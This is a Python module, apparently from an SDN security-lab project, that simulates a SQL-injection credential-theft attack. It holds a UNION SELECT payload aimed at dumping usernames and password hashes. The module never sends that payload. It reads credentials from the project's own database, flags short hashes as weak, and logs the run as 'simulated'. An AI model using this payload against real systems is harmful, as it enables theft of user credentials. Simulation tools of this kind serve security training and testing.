import os
import sys
import time
import random
from typing import Dict, Any

project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)
try:
    from SDNMFA.attacks.base_attack import AttackConfig, AttackResult
    from SDNMFA.database.db_config import get_db_connection
except ImportError:
    from attacks.base_attack import AttackConfig, AttackResult
    from database.db_config import get_db_connection

def run_attack(cfg: AttackConfig) -> AttackResult:

    vulnerable_endpoint = f"https://{cfg.target_host}:8080/api/v1/userinfo?id=1"
    sql_payload = "1%20UNION%20SELECT%20NULL,username,password_hash%20FROM%20users--"
    time.sleep(1.5)

    conn = get_db_connection()
    stolen_count = 0
    cracked_count = 0
    stolen_preview = []
    weak_passwords = []

    if not conn:
        return AttackResult(False, "Database connection failed", {"simulated": True})

    try:
        with conn.cursor() as cur:
            cur.execute("SELECT username, password_hash, email FROM users;")
            rows = cur.fetchall()

            for username, pw_hash, email in rows:
                is_weak = False
                if pw_hash and isinstance(pw_hash, str):
                    if len(pw_hash) <= 32:
                        is_weak = True
                        cracked_count += 1
                        weak_passwords.append({"username": username, "hash": pw_hash})

                stolen_count += 1
                if random.random() < 0.1:
                    stolen_preview.append({"username": username, "hash": pw_hash, "is_weak": is_weak})

            cur.execute("""
                INSERT INTO attack_logs 
                (username, attack_type, target_host, target_port, duration_seconds, rate_pps, threads, 
                 packets_sent, bytes_sent, actual_rate_pps, success, message) 
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s);
                """,
                (cfg.username, "credential_theft", cfg.target_host, cfg.target_port, 0, 0, 0,
                 0, 0, 0.0, True, f"SQLi exploited. Stolen: {stolen_count}, Weak: {cracked_count}")
            )
            conn.commit()

    except Exception as e:
        if conn:
            conn.rollback()
        return AttackResult(False, f"Attack failed: {str(e)}", {})
    finally:
        if conn:
            conn.close()

    metrics: Dict[str, Any] = {
        "vulnerability": "SQL Injection",
        "target_endpoint": vulnerable_endpoint,
        "sql_payload": sql_payload,
        "rows_exfiltrated": len(rows),
        "credentials_stolen": stolen_count,
        "weak_hashes_crackable": cracked_count,
        "sample_data": stolen_preview[:3],
        "simulated": True
    }
    return AttackResult(True, f"Stolen {stolen_count} credentials ({cracked_count} weak)", metrics)
